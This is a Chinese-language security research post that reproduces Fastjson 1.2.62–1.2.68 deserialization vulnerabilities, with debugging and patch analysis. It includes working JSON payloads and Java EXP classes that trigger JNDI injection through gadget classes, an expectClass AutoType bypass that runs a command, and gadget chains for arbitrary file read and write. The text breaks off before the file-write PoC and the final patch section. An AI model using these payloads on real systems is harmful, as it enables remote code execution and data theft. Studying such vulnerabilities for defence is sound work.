# Java 反序列化 Fastjson 篇 04-Fastjson 1.2.62-1.2.68 版本反序列化漏洞

## 0x01 前言

复现 Mi1k7ea 师傅的文章：[Fastjson系列六——1.2.48-1.2.68反序列化漏洞](https://www.mi1k7ea.com/2021/02/08/Fastjson系列六——1-2-48-1-2-68反序列化漏洞/)

学习一下 Fastjson 1.2.62-1.2.68 版本反序列化的漏洞，主要思路的话还是基于黑名单的绕过，然后构造出可行的 EXP 来攻击。

## 0x02 1.2.62 反序列化漏洞

### 前提条件

- 需要开启AutoType；
- Fastjson <= 1.2.62；
- JNDI注入利用所受的JDK版本限制；
- 目标服务端需要存在xbean-reflect包；xbean-reflect 包的版本不限，我这里把 pom.xml 贴出来。

**pom.xml**

XML

```
<dependencies>

<dependency>  
 <groupId>com.alibaba</groupId>  
 <artifactId>fastjson</artifactId>  
 <version>1.2.62</version>  
</dependency>  
<dependency>  
 <groupId>org.apache.xbean</groupId>  
 <artifactId>xbean-reflect</artifactId>  
 <version>4.18</version>  
</dependency>  
<dependency>  
 <groupId>commons-collections</groupId>  
 <artifactId>commons-collections</artifactId>  
 <version>3.2.1</version>  
</dependency>
</dependencies>
```

### 漏洞原理与 EXP

新 Gadget 绕过黑名单限制。

org.apache.xbean.propertyeditor.JneeeeediConverter 类的 `toObjectImpl()` 函数存在 JNDI 注入漏洞，可由其构造函数处触发利用。

我们这里可以去到 `JndiConverter` 这个类里面，看到 `toObjectImpl()` 方法确实是存在 JNDI 漏洞的。

![img](https://drun1baby.top/2022/08/13/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Fastjson%E7%AF%8704-Fastjson1-2-62-1-2-68%E7%89%88%E6%9C%AC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/JndiLookup.png)

- 但是这个 `toObjectImpl()` 方法并不是 getter/setter 方法，也不是构造函数，我不太明白为什么会被调用，后面问了一下 Johnford 师傅，更明确了 Fastjson 漏洞利用的方式。

因为我们对 `JndiConverter` 这个类进行反序列化的时候，会自动调用它的构造函数，而它的构造函数里面调用了它的父类。所以我们反序列化的时候不仅能够调用 `JndiConverter` 这个类，还会去调用它的父类 `AbstractConverter`

然后在父类 `AbstractConverter` 中，呃，这里咋说呢；我最早是去找谁调用了 `JndiConverter#toObjectImpl()`，就找到了 `AbstractConverter#setAsText()`；也就是这里不是单纯的逆向思维，而是正向和逆向思维一起作用的。

![img](https://drun1baby.top/2022/08/13/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Fastjson%E7%AF%8704-Fastjson1-2-62-1-2-68%E7%89%88%E6%9C%AC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/1262Chains.png)

所以这里我们的 payload 可以设置成这样

JSON

```
"{

\"@type\":\"org.apache.xbean.propertyeditor.JndiConverter\", 
\"AsText\":\"ldap://127.0.0.1:1234/ExportObject\"

}"
```

EXP 如下

JAVA

```
import com.alibaba.fastjson.JSON;  
import com.alibaba.fastjson.parser.ParserConfig;  
import org.apache.xbean.propertyeditor.JndiConverter;  
  
public class EXP_1262 {  
    public static void main(String[] args) {  
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);  
 String poc = "{\"@type\":\"org.apache.xbean.propertyeditor.JndiConverter\"," +  
                "\"AsText\":\"ldap://127.0.0.1:1234/ExportObject\"}";  
 JSON.parse(poc);  
 }  
}
```

![img](https://drun1baby.top/2022/08/13/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Fastjson%E7%AF%8704-Fastjson1-2-62-1-2-68%E7%89%88%E6%9C%AC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/1262Success.png)

### 调试分析

- 我这里只分析开启 autoType 的，如果未开启 AutoType、未设置 expectClass 且类名不在内部白名单中，是不能恶意加载字节码的。

直接在 `CheckAutoType()` 函数上打上断点开始分析，函数位置：`com\alibaba\fastjson\parser\ParserConfig.java`

相比于之前版本调试分析时看的 `CheckAutoType()` 函数，这里新增了一些代码逻辑，这里大致说下，下面代码是判断是否调用 AutoType 相关逻辑之前的代码，说明如注释：

JAVA

```
if (typeName == null) {
          return null;
      }
 
// 限制了JSON中@type指定的类名长度
      if (typeName.length() >= 192 || typeName.length() < 3) {
          throw new JSONException("autoType is not support. " + typeName);
      }
 
// 单独对expectClass参数进行判断，设置expectClassFlag的值
// 当且仅当expectClass参数不为空且不为Object、Serializable、...等类类型时expectClassFlag才为true
      final boolean expectClassFlag;
      if (expectClass == null) {
          expectClassFlag = false;
      } else {
          if (expectClass == Object.class
                  || expectClass == Serializable.class
                  || expectClass == Cloneable.class
                  || expectClass == Closeable.class
                  || expectClass == EventListener.class
                  || expectClass == Iterable.class
                  || expectClass == Collection.class
                  ) {
              expectClassFlag = false;
          } else {
              expectClassFlag = true;
          }
      }
 
      String className = typeName.replace('$', '.');
      Class<?> clazz = null;
 
      final long BASIC = 0xcbf29ce484222325L;
      final long PRIME = 0x100000001b3L;
 
// 1.2.43检测，"["
      final long h1 = (BASIC ^ className.charAt(0)) * PRIME;
      if (h1 == 0xaf64164c86024f1aL) { // [
          throw new JSONException("autoType is not support. " + typeName);
      }
 
// 1.2.41检测，"Lxx;"
      if ((h1 ^ className.charAt(className.length() - 1)) * PRIME == 0x9198507b5af98f0L) {
          throw new JSONException("autoType is not support. " + typeName);
      }
 
// 1.2.42检测，"LL"
      final long h3 = (((((BASIC ^ className.charAt(0))
              * PRIME)
              ^ className.charAt(1))
              * PRIME)
              ^ className.charAt(2))
              * PRIME;
 
// 对类名进行Hash计算并查找该值是否在INTERNAL_WHITELIST_HASHCODES即内部白名单中，若在则internalWhite为true
      boolean internalWhite = Arrays.binarySearch(INTERNAL_WHITELIST_HASHCODES,
              TypeUtils.fnv1a_64(className)
      ) >= 0;
```

- 断点位置如图，开始调试。

![img](https://drun1baby.top/2022/08/13/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Fastjson%E7%AF%8704-Fastjson1-2-62-1-2-68%E7%89%88%E6%9C%AC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/1262DebugPoint.png)

和前面一样的，看看关键点。

这里是进入了第一个判断的代码逻辑即开启AutoType的检测逻辑，先进行哈希白名单匹配、然后进行哈希黑名单过滤，但由于该类不在黑白名单中所以这块检测通过了并往下执行：

![img](https://drun1baby.top/2022/08/13/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Fastjson%E7%AF%8704-Fastjson1-2-62-1-2-68%E7%89%88%E6%9C%AC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/1262White.png)

往下执行，到未开启AutoType的检测逻辑时直接跳过再往下执行，由于AutoTypeSupport为true，进入调用`loadClass()`函数的逻辑来加载恶意类：

![img](https://drun1baby.top/2022/08/13/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Fastjson%E7%AF%8704-Fastjson1-2-62-1-2-68%E7%89%88%E6%9C%AC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/AutoTypeSupport.png)

就简单来说，和之前的没什么区别，后续就不再分析了。

### 补丁分析

黑名单绕过的Gadget补丁都是在新版本中添加新Gadget黑名单来进行防御的：[https://github.com/alibaba/fastjson/compare/1.2.62%E2%80%A61.2.66#diff-f140f6d9ec704eccb9f4068af9d536981a644f7d2a6e06a1c50ab5ee078ef6b4](https://github.com/alibaba/fastjson/compare/1.2.62…1.2.66#diff-f140f6d9ec704eccb9f4068af9d536981a644f7d2a6e06a1c50ab5ee078ef6b4)

新版本运行后直接被抛出异常：

JAVA

```
Exception in thread "main" com.alibaba.fastjson.JSONException: autoType is not support. org.apache.xbe
```

在哈希黑名单中添加了该类，其中匹配到了该恶意类的Hash值：

![img](https://drun1baby.top/2022/08/13/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Fastjson%E7%AF%8704-Fastjson1-2-62-1-2-68%E7%89%88%E6%9C%AC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/EvilRegexHash.png)

## 0x03 1.2.66 反序列化漏洞

### 前提条件

- 开启AutoType；
- Fastjson <= 1.2.66；
- JNDI注入利用所受的JDK版本限制；
- org.apache.shiro.jndi.JndiObjectFactory类需要shiro-core包；
- br.com.anteros.dbcp.AnterosDBCPConfig 类需要 Anteros-Core和 Anteros-DBCP 包；
- com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig类需要ibatis-sqlmap和jta包；

### 漏洞原理

新Gadget绕过黑名单限制。

1.2.66涉及多条Gadget链，原理都是存在JDNI注入漏洞。

org.apache.shiro.realm.jndi.JndiRealmFactory类PoC：

JSON

```
{"@type":"org.apache.shiro.realm.jndi.JndiRealmFactory", "jndiNames":["ldap://localhost:1389/Exploit"], "Realms":[""]}
```

br.com.anteros.dbcp.AnterosDBCPConfig类PoC：

JSON

```
{"@type":"br.com.anteros.dbcp.AnterosDBCPConfig","metricRegistry":"ldap://localhost:1389/Exploit"}或{"@type":"br.com.anteros.dbcp.AnterosDBCPConfig","healthCheckRegistry":"ldap://localhost:1389/Exploit"}
```

com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig类PoC：

JSON

```
{"@type":"com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig","properties": {"@type":"java.util.Properties","UserTra
```

### EXP

JAVA

```
import com.alibaba.fastjson.JSON;  
import com.alibaba.fastjson.parser.ParserConfig;  
  
public class EXP_1266 {  
    public static void main(String[] args) {  
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);  
 String poc = "{\"@type\":\"org.apache.shiro.realm.jndi.JndiRealmFactory\", \"jndiNames\":[\"ldap://localhost:1234/ExportObject\"], \"Realms\":[\"\"]}";  
//        String poc = "{\"@type\":\"br.com.anteros.dbcp.AnterosDBCPConfig\",\"metricRegistry\":\"ldap://localhost:1389/Exploit\"}";  
//        String poc = "{\"@type\":\"br.com.anteros.dbcp.AnterosDBCPConfig\",\"healthCheckRegistry\":\"ldap://localhost:1389/Exploit\"}";  
//        String poc = "{\"@type\":\"com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig\"," +  
//                "\"properties\": {\"@type\":\"java.util.Properties\",\"UserTransaction\":\"ldap://localhost:1389/Exploit\"}}";  
 JSON.parse(poc);  
 }  
}
```

## 0x04 1.2.67反序列化漏洞（黑名单绕过）

### 前提条件

- 开启AutoType；
- Fastjson <= 1.2.67；
- JNDI注入利用所受的JDK版本限制；
- org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup类需要ignite-core、ignite-jta和jta依赖；
- org.apache.shiro.jndi.JndiObjectFactory类需要shiro-core和slf4j-api依赖；

### 漏洞原理

新Gadget绕过黑名单限制。

org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup类PoC：

JSON

```
{"@type":"org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup", "jndiNames":["ldap://localhost:1389/Exploit"], "tm": {"$ref":"$.tm"}}
```

org.apache.shiro.jndi.JndiObjectFactory类PoC：

JSON

```
{"@type":"org.apache.shiro.jndi.JndiObjectFactory","resourceName":"ldap://localhost:1389/Exploit","instance":{"$ref":"$.instance"}}
```

EXP

JAVA

```
import com.alibaba.fastjson.JSON;  
import com.alibaba.fastjson.parser.ParserConfig;  
import com.sun.xml.internal.ws.api.ha.StickyFeature;  
  
public class EXP_1267 {  
    public static void main(String[] args) {  
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);  
 String poc = "{\"@type\":\"org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup\"," +  
                " \"jndiNames\":[\"ldap://localhost:1234/ExportObject\"], \"tm\": {\"$ref\":\"$.tm\"}}";  
 JSON.parse(poc);  
 }  
}
```

## 0x05 1.2.68反序列化漏洞（expectClass绕过AutoType）

- 这个洞可以稍微看一下，感觉是可以结合利用的。

### 前提条件

- Fastjson <= 1.2.68；
- 利用类必须是expectClass类的子类或实现类，并且不在黑名单中；

### 漏洞原理

本次绕过`checkAutoType()`函数的关键点在于其第二个参数expectClass，可以通过构造恶意JSON数据、传入某个类作为expectClass参数再传入另一个expectClass类的子类或实现类来实现绕过`checkAutoType()`函数执行恶意操作。

简单地说，本次绕过`checkAutoType()`函数的攻击步骤为：

1. 先传入某个类，其加载成功后将作为expectClass参数传入`checkAutoType()`函数；
2. 查找expectClass类的子类或实现类，如果存在这样一个子类或实现类其构造方法或`setter`方法中存在危险操作则可以被攻击利用；

### 漏洞复现

简单地验证利用expectClass绕过的可行性，先假设Fastjson服务端存在如下实现AutoCloseable接口类的恶意类VulAutoCloseable：

JAVA

```
public class VulAutoCloseable implements AutoCloseable {
    public VulAutoCloseable(String cmd) {
        try {
            Runtime.getRuntime().exec(cmd);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
 
    @Override
    public void close() throws Exception {
 
    }
}
```

构造PoC如下：

JSON

```
{"@type":"java.lang.AutoCloseable","@type":"org.example.VulAutoCloseable","cmd":"calc"}
```

无需开启AutoType，直接成功绕过`CheckAutoType()`的检测从而触发执行：

![img](https://drun1baby.top/2022/08/13/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Fastjson%E7%AF%8704-Fastjson1-2-62-1-2-68%E7%89%88%E6%9C%AC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/Success1268.png)

### 调试分析

直接在`CheckAutoType()`函数中打断点开始调试。

第一次是传入 `AutoCloseable` 类进行校验，这里`CheckAutoType()`函数的 `expectClass` 参数是为 null 的：

![img](https://drun1baby.top/2022/08/13/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Fastjson%E7%AF%8704-Fastjson1-2-62-1-2-68%E7%89%88%E6%9C%AC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/expectClassNull.png)

往下，直接从缓存 Mapping 中获取到了 `AutoCloseable` 类：然后获取到这个 `clazz` 之后进行了一系列的判断，`clazz` 是否为 null，以及关于 internalWhite 的判断，internalWhite 就是内部加白的名单，很显然我们这里肯定不是，内部加白的名单一定是非常安全的。

![img](https://drun1baby.top/2022/08/13/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Fastjson%E7%AF%8704-Fastjson1-2-62-1-2-68%E7%89%88%E6%9C%AC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/getTypeName.png)

然后后面这个判断里面出现了 `expectClass`，先判断 `clazz` 是否不是 `expectClass` 类的继承类且不是 `HashMap` 类型，是的话抛出异常，否则直接返回该类。

我们这里没有 `expectClass`，所以会直接返回 `AutoCloseable` 类：

![img](https://drun1baby.top/2022/08/13/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Fastjson%E7%AF%8704-Fastjson1-2-62-1-2-68%E7%89%88%E6%9C%AC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/HashMapClass.png)

接着，返回到 `DefaultJSONParser` 类中获取到 `clazz` 后再继续执行，根据 `AutoCloseable` 类获取到反序列化器为 `JavaBeanDeserializer`，然后应用该反序列化器进行反序列化操作：

![img](https://drun1baby.top/2022/08/13/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Fastjson%E7%AF%8704-Fastjson1-2-62-1-2-68%E7%89%88%E6%9C%AC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/Deserializer.png)

往里走，调用的是 `JavaBeanDeserializer` 的 `deserialze()` 方法进行反序列化操作，其中 type 参数就是传入的 `AutoCloseable类`，如图：

![img](https://drun1baby.top/2022/08/13/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Fastjson%E7%AF%8704-Fastjson1-2-62-1-2-68%E7%89%88%E6%9C%AC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/BeanDeserializer.png)

往下的逻辑，就是解析获取 PoC 后面的类的过程。这里看到获取不到对象反序列化器之后，就会进去如图的判断逻辑中，设置 type 参数即 `java.lang.AutoCloseable` 类为 `checkAutoType()` 方法的 expectClass 参数来调用 `checkAutoType()` 函数来获取指定类型，然后在获取指定的反序列化器：

![img](https://drun1baby.top/2022/08/13/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Fastjson%E7%AF%8704-Fastjson1-2-62-1-2-68%E7%89%88%E6%9C%AC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/expectClassCheck.png)

此时，第二次进入 `checkAutoType()` 函数，typeName 参数是 PoC 中第二个指定的类，expectClass 参数则是 PoC 中第一个指定的类：

![img](https://drun1baby.top/2022/08/13/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Fastjson%E7%AF%8704-Fastjson1-2-62-1-2-68%E7%89%88%E6%9C%AC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/TwiceCheckAutoType.png)

往下，由于java.lang.AutoCloseable类并非其中黑名单中的类，因此expectClassFlag被设置为true：

![img](https://drun1baby.top/2022/08/13/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Fastjson%E7%AF%8704-Fastjson1-2-62-1-2-68%E7%89%88%E6%9C%AC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/Success1268.png)

往下，由于expectClassFlag为true且目标类不在内部白名单中，程序进入AutoType开启时的检测逻辑：

![img](https://drun1baby.top/2022/08/13/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Fastjson%E7%AF%8704-Fastjson1-2-62-1-2-68%E7%89%88%E6%9C%AC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/internalWhitelist.png)

由于我们定义的 `VulAutoCloseable` 类不在黑白名单中，因此这段能通过检测并继续往下执行。

往下，未加载成功目标类，就会进入 AutoType 关闭时的检测逻辑，和上同理，这段能通过检测并继续往下执行：

![img](https://drun1baby.top/2022/08/13/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Fastjson%E7%AF%8704-Fastjson1-2-62-1-2-68%E7%89%88%E6%9C%AC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/AutoTypeSupport.png)

往下，由于expectClassFlag为true，进入如下的loadClass()逻辑来加载目标类，但是由于AutoType关闭且jsonType为false，因此调用loadClass()函数的时候是不开启cache即缓存的：

![img](https://drun1baby.top/2022/08/13/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Fastjson%E7%AF%8704-Fastjson1-2-62-1-2-68%E7%89%88%E6%9C%AC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/loadClassNoCache.png)

跟进该函数，使用AppClassLoader加载 VulAutoCloseable 类并直接返回：

![img](https://drun1baby.top/2022/08/13/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Fastjson%E7%AF%8704-Fastjson1-2-62-1-2-68%E7%89%88%E6%9C%AC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/ClassLoader.png)

往下，判断是否jsonType、true的话直接添加Mapping缓存并返回类，否则接着判断返回的类是否是ClassLoader、DataSource、RowSet等类的子类，是的话直接抛出异常，这也是过滤大多数JNDI注入Gadget的机制：

![img](https://drun1baby.top/2022/08/13/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Fastjson%E7%AF%8704-Fastjson1-2-62-1-2-68%E7%89%88%E6%9C%AC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/JNDIGadget.png)

前面的都能通过，往下，如果expectClass不为null，则判断目标类是否是expectClass类的子类，是的话就添加到Mapping缓存中并直接返回该目标类，否则直接抛出异常导致利用失败，**这里就解释了为什么恶意类必须要继承AutoCloseable接口类，因为这里expectClass为AutoCloseable类、因此恶意类必须是AutoCloseable类的子类才能通过这里的判断**：

![img](https://drun1baby.top/2022/08/13/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Fastjson%E7%AF%8704-Fastjson1-2-62-1-2-68%E7%89%88%E6%9C%AC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/ImportanceBypass.png)

- 之后就是结尾处，恶意类的触发

![img](https://drun1baby.top/2022/08/13/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Fastjson%E7%AF%8704-Fastjson1-2-62-1-2-68%E7%89%88%E6%9C%AC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/1268Starter.png)

> 简单总结一下：我们在 PoC 里面定义了两个 `@type`

第一个 `@type` 进去什么都没有发生；但是第一个 `@type` 是作为第二个指定的类里面的 expectClass。所以说白了，loadClass 去作用的类是第一个 `@type`；如果这个 `@type` 是可控的恶意类，可以造成命令执行攻击。

并且需要加载的目标类是expectClass类的子类或者实现类时（不在黑名单中）

### 实际利用

前面漏洞复现只是简单地验证绕过方法的可行性，在实际的攻击利用中，是需要我们去寻找实际可行的利用类的。

这里直接参考[b1ue大佬文章](https://b1ue.cn/archives/364.html)，主要是寻找关于输入输出流的类来写文件，IntputStream和OutputStream都是实现自AutoCloseable接口的。

> 我寻找 gadget 时的条件是这样的。
>
> - 需要一个通过 set 方法或构造方法指定文件路径的 OutputStream
> - 需要一个通过 set 方法或构造方法传入字节数据的 OutputStream，参数类型必须是byte[]、ByteBuffer、String、char[]其中的一个，并且可以通过 set 方法或构造方法传入一个 OutputStream，最后可以通过 write 方法将传入的字节码 write 到传入的 OutputStream
> - 需要一个通过 set 方法或构造方法传入一个 OutputStream，并且可以通过调用 toString、hashCode、get、set、构造方法 调用传入的 OutputStream 的 close、write 或 flush 方法
>
> 以上三个组合在一起就能构造成一个写文件的利用链，我通过扫描了一下 JDK ，找到了符合第一个和第三个条件的类。
>
> 分别是 FileOutputStream 和 ObjectOutputStream，但这两个类选取的构造器，不符合情况，所以只能找到这两个类的子类，或者功能相同的类。

#### 复制文件（任意文件读取漏洞）

利用类：**org.eclipse.core.internal.localstore.SafeFileOutputStream**

依赖：

XML

```
<dependency>  
 <groupId>org.aspectj</groupId>  
 <artifactId>aspectjtools</artifactId>  
 <version>1.9.5</version>  
</dependency>
```

看下SafeFileOutputStream类的源码，其`SafeFileOutputStream(java.lang.String, java.lang.String)`构造函数判断了如果targetPath文件不存在且tempPath文件存在，就会把tempPath复制到targetPath中，正是利用其构造函数的这个特点来实现Web场景下的任意文件读取：

JAVA

```
public class SafeFileOutputStream extends OutputStream {
    protected File temp;
    protected File target;
    protected OutputStream output;
    protected boolean failed;
    protected static final String EXTENSION = ".bak";
 
    public SafeFileOutputStream(File file) throws IOException {
        this(file.getAbsolutePath(), (String)null);
    }
 
    // 该构造函数判断如果targetPath文件不存在且tempPath文件存在，就会把tempPath复制到targetPath中
    public SafeFileOutputStream(String targetPath, String tempPath) throws IOException {
        this.failed = false;
        this.target = new File(targetPath);
        this.createTempFile(tempPath);
        if (!this.target.exists()) {
            if (!this.temp.exists()) {
                this.output = new BufferedOutputStream(new FileOutputStream(this.target));
                return;
            }
 
            this.copy(this.temp, this.target);
        }
 
        this.output = new BufferedOutputStream(new FileOutputStream(this.temp));
    }
 
    public void close() throws IOException {
        try {
            this.output.close();
        } catch (IOException var2) {
            this.failed = true;
            throw var2;
        }
 
        if (this.failed) {
            this.temp.delete();
        } else {
            this.commit();
        }
 
    }
 
    protected void commit() throws IOException {
        if (this.temp.exists()) {
            this.target.delete();
            this.copy(this.temp, this.target);
            this.temp.delete();
        }
    }
 
    protected void copy(File sourceFile, File destinationFile) throws IOException {
        if (sourceFile.exists()) {
            if (!sourceFile.renameTo(destinationFile)) {
                InputStream source = null;
                BufferedOutputStream destination = null;
 
                try {
                    source = new BufferedInputStream(new FileInputStream(sourceFile));
                    destination = new BufferedOutputStream(new FileOutputStream(destinationFile));
                    this.transferStreams(source, destination);
                    destination.close();
                } finally {
                    FileUtil.safeClose(source);
                    FileUtil.safeClose(destination);
                }
 
            }
        }
    }
 
    protected void createTempFile(String tempPath) {
        if (tempPath == null) {
            tempPath = this.target.getAbsolutePath() + ".bak";
        }
 
        this.temp = new File(tempPath);
    }
 
    public void flush() throws IOException {
        try {
            this.output.flush();
        } catch (IOException var2) {
            this.failed = true;
            throw var2;
        }
    }
 
    public String getTempFilePath() {
        return this.temp.getAbsolutePath();
    }
 
    protected void transferStreams(InputStream source, OutputStream destination) throws IOException {
        byte[] buffer = new byte[8192];
 
        while(true) {
            int bytesRead = source.read(buffer);
            if (bytesRead == -1) {
                return;
            }
 
            destination.write(buffer, 0, bytesRead);
        }
    }
 
    public void write(int b) throws IOException {
        try {
            this.output.write(b);
        } catch (IOException var3) {
            this.failed = true;
            throw var3;
        }
    }
}
```

![img](https://drun1baby.top/2022/08/13/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Fastjson%E7%AF%8704-Fastjson1-2-62-1-2-68%E7%89%88%E6%9C%AC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/AnyFileRead.png)

#### 写入文件

写内容类：**com.esotericsoftware.kryo.io.Output**

依赖：

XML

```
<dependency>
    <groupId>com.esotericsoftware</groupId>
    <artifactId>kryo</artifactId>
    <version>4.0.0</version>
</dependency>
```

Output类主要用来写内容，它提供了`setBuffer()`和`setOutputStream()`两个setter方法可以用来写入输入流，其中buffer参数值是文件内容，outputStream参数值就是前面的SafeFileOutputStream类对象，而要触发写文件操作则需要调用其`flush()`函数：

JAVA

```
/** Sets a new OutputStream. The position and total are reset, discarding any buffered bytes.
 * @param outputStream May be null. */
public void setOutputStream (OutputStream outputStream) {
    this.outputStream = outputStream;
    position = 0;
    total = 0;
}
 
...
 
/** Sets the buffer that will be written to. {@link #setBuffer(byte[], int)} is called with the specified buffer's length as the
 * maxBufferSize. */
public void setBuffer (byte[] buffer) {
    setBuffer(buffer, buffer.length);
}
 
...
 
/** Writes the buffered bytes to the underlying OutputStream, if any. */
public void flush () throws KryoException {
    if (outputStream == null) return;
    try {
        outputStream.write(buffer, 0, position);
        outputStream.flush();
    } catch (IOException ex) {
        throw new KryoException(ex);
    }
    total += position;
    position = 0;
}
 
...
```

如果可以写入文件的话，我们这里可以写入一些恶意文件。

接着，就是要看怎么触发Output类`flush()`函数了，`flush()`函数只有在`close()`和`require()`函数被调用时才会触发，其中`require()`函数在调用write相关函数时会被触发。这也是链子的思维

其中，找到JDK的ObjectOutputStream类，其内部类BlockDataOutputStream的构造函数中将OutputStream类型参数赋值给out成员变量，而其`setBlockDataMode()`函数中调用了`drain()`函数、`drain()`函数中又调用了`out.write()`函数，满足前面的需求：

JAVA

```
/**  
 * Creates new BlockDataOutputStream on top of given underlying stream.  
 * Block data mode is turned off by default.  
 */  
 BlockDataOutputStream(OutputStream out) {  
 this.out = out;  
 dout = new DataOutputStream(this);  
 }  
  
 /**  
 * Sets block data mode to the given mode (true == on, false == off)  
 * and returns the previous mode value.  If the new mode is the same as  
 * the old mode, no action is taken.  If the new mode differs from the  
 * old mode, any buffered data is flushed before switching to the new  
 * mode.  
 */  
 boolean setBlockDataMode(boolean mode) throws IOException {  
 if (blkmode == mode) {  
 return blkmode;  
 }  
 drain();  
 blkmode = mode;  
 return !blkmode;  
 }  
  
...  
  
 /**  
 * Writes all buffered data from this stream to the underlying stream,  
 * but does not flush underlying stream.  
 */  
 void drain() throws IOException {  
 if (pos == 0) {  
 return;  
 }  
 if (blkmode) {  
 writeBlockHeader(pos);  
 }  
 out.write(buf, 0, pos);  
 pos = 0;  
 }
```

对于setBlockDataMode()函数的调用，在ObjectOutputStream类的有参构造函数中就存在：

JAVA

```
public ObjectOutputStream(OutputStream out) throws IOException {  
 verifySubclass();  
 bout = new BlockDataOutputStream(out);  
 handles = new HandleTable(10, (float) 3.00);  
 subs = new ReplaceTable(10, (float) 3.00);  
 enableOverride = false;  
 writeStreamHeader();  
 bout.setBlockDataMode(true);  
 if (extendedDebugInfo) {  
 debugInfoStack = new DebugTraceInfoStack();  
 } else {  
 debugInfoStack = null;  
 }  
}
```

但是Fastjson优先获取的是ObjectOutputStream类的无参构造函数，因此只能找ObjectOutputStream的继承类来触发了。

只有有参构造函数的ObjectOutputStream继承类：**com.sleepycat.bind.serial.SerialOutput**

依赖：

XML

```
<dependency>  
 <groupId>com.sleepycat</groupId>  
 <artifactId>je</artifactId>  
 <version>5.0.73</version>  
</dependency>
```

看到，SerialOutput类的构造函数中是调用了父类ObjectOutputStream的有参构造函数，这就满足了前面的条件了：

JAVA

```
public SerialOutput(OutputStream out, ClassCatalog classCatalog)  
 throws IOException {  
  
 super(out);  
 this.classCatalog = classCatalog;  
  
 /* guarantee that we'll always use the same serialization format */  
  
 useProtocolVersion(ObjectStreamConstants.PROTOCOL_VERSION_2);  
}
```

PoC如下，用到了Fastjson循环引用的技巧来调用：

这里写入文件内容其实有限制，有的特殊字符并不能直接写入到目标文件中，比如写不进PHP代码等。

攻击利用成功。

### 补丁分析

